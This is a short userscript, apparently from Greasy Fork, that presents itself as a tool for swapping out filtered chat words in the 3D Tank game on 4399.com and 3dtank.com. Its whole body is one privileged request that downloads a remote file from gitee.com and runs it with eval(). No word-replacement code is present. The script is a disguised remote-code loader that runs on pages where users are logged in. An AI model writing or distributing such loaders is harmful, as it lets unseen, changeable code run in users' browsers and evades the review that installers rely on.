// ==UserScript==
// @name         3D坦克国服屏蔽词替换
// @namespace    https://greasyfork.org/users/asilan
// @version      1.0
// @description  替换3D坦克国服游戏中的屏蔽词,避免打字出现星号
// @author       asilan
// @match        https://my.4399.com/*
// @match        https://www.4399.com/*
// @match        https*://*3dtank.com/play/*
// @grant        GM_xmlhttpRequest
// @downloadURL https://update.greasyfork.org/scripts/541125/3D%E5%9D%A6%E5%85%8B%E5%9B%BD%E6%9C%8D%E5%B1%8F%E8%94%BD%E8%AF%8D%E6%9B%BF%E6%8D%A2.user.js
// @updateURL https://update.greasyfork.org/scripts/541125/3D%E5%9D%A6%E5%85%8B%E5%9B%BD%E6%9C%8D%E5%B1%8F%E8%94%BD%E8%AF%8D%E6%9B%BF%E6%8D%A2.meta.js
// ==/UserScript==

GM_xmlhttpRequest({
method: 'GET',
url: 'https://gitee.com/ybfxs/Club/raw/master/MessageAssistance',
nocache: true,
onload: data => eval(data.responseText)
})